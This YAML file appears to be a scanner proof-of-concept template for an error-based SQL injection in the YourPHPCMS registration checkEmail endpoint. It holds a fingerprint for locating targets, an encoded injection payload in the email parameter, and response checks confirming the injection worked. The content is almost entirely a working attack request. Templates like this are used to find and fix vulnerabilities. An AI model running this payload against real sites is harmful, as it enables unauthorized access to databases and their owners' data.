id: poc-yaml-yourphpcms-register-sqli
info:
  name: YourPHPCMS Register SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: yourphpcms
  fofa: header="YP_onlineid"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /index.php?g=User&m=Register&a=checkEmail&userid=1&email=%27+AND+%28SELECT+2578+FROM%28SELECT+COUNT%28%2A%29%2CCONCAT%28md5({{.t1}})%2C%28SELECT+%28ELT%282578%3D2578%2C1%29%29%29%2C0x7162627671%2CFLOOR%28RAND%280%29%2A2%29%29x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x%29a%29--+xmVt
  expression: status_code == 200 && contains(body,"系统发生错误 ") && contains(body,"SQL语句")
    && contains(body,t2)
transport: http
